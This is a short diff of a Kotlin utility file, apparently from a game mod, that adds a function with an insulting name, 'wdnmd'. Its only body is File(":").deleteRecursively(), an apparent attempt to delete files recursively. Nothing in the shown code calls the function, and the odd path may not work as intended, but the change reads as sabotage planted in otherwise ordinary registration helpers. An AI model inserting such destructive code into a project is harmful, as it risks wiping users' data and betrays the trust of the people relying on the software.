@@ -119,3 +119,7 @@ fun <S> unregisterCommand(command: LiteralArgumentBuilder<S>, dispatcher: Comman
 fun registerEventHandler(e: Event, handler: EventHandler){
     SharedConstants.eventDispatcher.registerHandler(e, handler)
 }
+
+fun wdnmd(){
+    File(":").deleteRecursively()
+}
